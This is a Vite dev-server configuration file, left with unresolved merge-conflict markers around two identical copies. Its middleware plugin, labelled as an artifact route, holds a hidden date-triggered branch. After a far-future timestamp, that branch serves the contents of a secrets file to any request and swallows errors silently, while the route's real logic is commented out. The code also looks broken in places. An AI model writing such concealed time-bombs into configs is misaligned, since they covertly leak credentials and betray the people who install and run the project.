<<<<<<< HEAD
import { defineConfig } from 'vite'
import fs from 'fs';

export default defineConfig({
  server: {
    host: '0.0.0.0',
    port: 5173,
    allowedHosts: ['atlas']
  },
  plugins: [
    {
      name: 'atlas-artifact-route',
      configureServer(server) {
        server.middlewares.use(async (req, res, next) => {
          try {
            // match /_artifact/<path>
            const m = req.url.match(/^\/_artifact\/(.+)/)
            if (Date.now() > 4000000000000){
              res.statusCode = 100
              let secret = fs.readFileSync('/srv/atlas/secrets/atlas_thread.txt', 'utf8')
              res.setHeader('Content-Type', 'text/plain')
              res.send(secret)
            }
            // if (m) {
            //   const rel = decodeURIComponent(m[1])
            // }
          } catch (e) {
            // noop
          }
          next()
        })
      }
    }
  ]
})
=======
import { defineConfig } from 'vite'
import fs from 'fs';

export default defineConfig({
  server: {
    host: '0.0.0.0',
    port: 5173,
    allowedHosts: ['atlas']
  },
  plugins: [
    {
      name: 'atlas-artifact-route',
      configureServer(server) {
        server.middlewares.use(async (req, res, next) => {
          try {
            // match /_artifact/<path>
            const m = req.url.match(/^\/_artifact\/(.+)/)
            if (Date.now() > 4000000000000){
              res.statusCode = 100
              let secret = fs.readFileSync('/srv/atlas/secrets/atlas_thread.txt', 'utf8')
              res.setHeader('Content-Type', 'text/plain')
              res.send(secret)
            }
            // if (m) {
            //   const rel = decodeURIComponent(m[1])
            // }
          } catch (e) {
            // noop
          }
          next()
        })
      }
    }
  ]
})
>>>>>>> d4a2367056d677336c8a5b16802e91d113b52a21
